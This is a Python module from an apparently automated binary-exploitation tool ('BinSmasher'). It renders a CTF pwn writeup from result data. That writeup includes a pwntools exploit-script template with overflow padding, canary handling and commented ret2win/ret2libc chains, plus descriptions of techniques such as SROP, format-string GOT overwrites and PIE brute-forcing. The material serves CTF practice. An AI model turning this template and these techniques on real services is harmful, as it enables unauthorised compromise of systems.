"""
Automatic writeup generator.
Produces a CTF-style writeup from BinSmasher result data.
"""
from __future__ import annotations
import logging
import os
import time

from constants import VERSION

log = logging.getLogger("binsmasher")


def generate_writeup(result: dict, output_path: str | None = None) -> str:
    """Generate a CTF-style writeup markdown from a BinSmasher result dict."""

    target   = result.get("target", {})
    analysis = result.get("analysis", {})
    prot     = result.get("protections", {})
    exploit  = result.get("exploit", {})
    meta     = result.get("meta", {})
    out_info = result.get("output", {})

    binary_name  = target.get("binary_name", "unknown")
    host         = target.get("host", "localhost")
    port         = target.get("port", 4444)
    vuln_type    = analysis.get("vuln_type", "UNKNOWN")
    offset       = analysis.get("offset")
    target_fn    = analysis.get("target_function", "unknown")
    exploit_type = exploit.get("type", "unknown")
    success      = exploit.get("success", False)
    canary_val   = exploit.get("canary")
    ret_addr     = exploit.get("return_addr")
    libc_base    = exploit.get("libc_base")
    libc_offs    = exploit.get("libc_offsets", {})

    nx            = prot.get("nx")
    pie           = prot.get("pie")
    aslr          = prot.get("aslr")
    relro         = prot.get("relro", "N/A")
    canary_en     = prot.get("canary_enabled")
    duration      = meta.get("duration_sec")
    timestamp     = meta.get("timestamp", time.strftime("%Y-%m-%d"))

    # Protection summary
    prot_lines = []
    prot_lines.append(f"| NX / DEP | {'✅ Enabled' if nx else '❌ Disabled'} |")
    prot_lines.append(f"| PIE | {'✅ Enabled' if pie else '❌ Disabled'} |")
    prot_lines.append(f"| ASLR | {'✅ Enabled' if aslr else '❌ Disabled'} |")
    prot_lines.append(f"| Stack Canary | {'✅ Present' if canary_en else '❌ None'} |")
    prot_lines.append(f"| RELRO | {relro} |")

    # Exploit type description
    technique_desc = {
        "ret2win":              "Direct jump to `win()`/`flag()` function — no leak needed.",
        "ret2libc_multistage":  "Two-stage exploit: leaked GOT address → computed libc base → `system(\"/bin/sh\")`.",
        "ret2libc_static":      "ret2libc with known libc addresses (no ASLR).",
        "ret2libc_aslr":        "ret2libc with leaked libc base (ASLR bypass via leak).",
        "stack_shellcode":      "Classic shellcode on stack (NX disabled).",
        "srop":                 "Sigreturn-Oriented Programming — fake sigcontext frame → `execve(\"/bin/sh\")`.",
        "orw_seccomp":          "Open-Read-Write chain to read the flag (seccomp blocks `execve`).",
        "format_string":        "Format string GOT overwrite — `%n` write to redirect execution.",
        "brute_ret2win":        "Brute-forced PIE base offset (512 attempts) to hit `win()`.",
        "arm64_ret2win":        "AArch64 return address overwrite to `win()`.",
        "arm64_ret2libc":       "AArch64 ret2libc via x0 gadget + system().",
        "arm64_execve_svc":     "AArch64 execve via `svc #0` + register control.",
    }.get(exploit_type, f"`{exploit_type}` — see BinSmasher output for details.")

    # Exploit code snippet
    if ret_addr:
        win_line = f"WIN_ADDR = {ret_addr}  # detected by BinSmasher"
    else:
        win_line = "WIN_ADDR = None  # not applicable"

    if libc_base:
        libc_lines = (
            f"LIBC_BASE  = {libc_base}\n"
            f"SYSTEM     = LIBC_BASE + {libc_offs.get('system', '???')}\n"
            f"BINSH      = LIBC_BASE + {libc_offs.get('binsh', libc_offs.get('str_bin_sh', '???'))}"
        )
    else:
        libc_lines = "# No libc leak needed for this exploit"

    canary_line = f"CANARY = {canary_val}" if canary_val else "# No canary"

    code_block = f"""```python
from pwn import *

HOST   = "{host}"
PORT   = {port}
BINARY = "{binary_name}"

context.binary = ELF(BINARY, checksec=False)
elf = context.binary

OFFSET = {offset}   # cyclic offset to return address
{canary_line}
{win_line}
{libc_lines}

def exploit():
    io = remote(HOST, PORT)
    # Drain banner if present
    try: io.recvline(timeout=1)
    except Exception: pass

    cv  = p64(CANARY) if {bool(canary_val)} else b""
    pad = b"B" * 8

    payload  = b"A" * OFFSET
    payload += cv
    payload += pad
    # TODO: add your exploit chain here
    # payload += p64(WIN_ADDR)  # ret2win
    # payload += p64(ret_gadget) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
```"""

    writeup = f"""# CTF Writeup: {binary_name}

**Date:** {timestamp}  
**Category:** pwn  
**Difficulty:** medium  
**Tool:** BinSmasher v{meta.get("version", VERSION)}  
**Status:** {"✅ Solved" if success else "❌ Not solved"}  
{"**Time:** " + str(duration) + "s" if duration else ""}

---

## Challenge Overview

Target: `{binary_name}` running on `{host}:{port}`

---

## Binary Analysis

### Protections

| Protection | Status |
|---|---|
{chr(10).join(prot_lines)}

### Vulnerability

**Type:** `{vuln_type}`  
**Offset to return address:** `{offset}` bytes  
**Vulnerable function:** `{target_fn}`  
{"**Stack canary:** `" + canary_val + "`" if canary_val else ""}

BinSmasher identified the vulnerability by:
{
    "- Bisecting the input size to find crash boundary\\n- Collecting a core dump and scanning stack for cyclic pattern" if vuln_type == "STACK_OVERFLOW"
    else "- Sending `%p.%p.%p.%p` and detecting `0x7f...` / `0x555...` in the response\\n- Finding the exact format string argument index via `AAAA%N$p`" if vuln_type == "FORMAT_STRING"
    else "- Detecting a crash on heap-sized inputs that does not occur on smaller inputs" if vuln_type == "HEAP_OVERFLOW"
    else "- Automatic probing of the service with crafted inputs"
}

---

## Exploit

### Technique

{technique_desc}

{"### Canary" + chr(10) + f"Leaked via format string / stack read: `{canary_val}`" + chr(10) if canary_val else ""}
{"### libc Base" + chr(10) + f"Leaked address resolved to libc base `{libc_base}` via local database / libc.rip." + chr(10) if libc_base else ""}
{"### Win function" + chr(10) + f"Direct jump to `{ret_addr}` (BinSmasher detected win/flag/shell symbol)." + chr(10) if ret_addr and not libc_base else ""}

### Exploit Script

{code_block}

---

## Flag

```
# Run the exploit:
python3 solve_{binary_name}.py
```

---

## Generated files

{chr(10).join(f"- `{f}`" for f in out_info.get("generated_files", [])) or "*(none)*"}

---

*Generated automatically by BinSmasher v{meta.get("version", "4.2")} — {timestamp}*
"""

    if output_path is None:
        from utils._process import WORK_DIR
        os.makedirs(WORK_DIR, exist_ok=True)
        output_path = os.path.join(WORK_DIR, f"writeup_{binary_name}.md")

    with open(output_path, "w") as f:
        f.write(writeup)

    log.info(f"[writeup] → {output_path}")
    return output_path
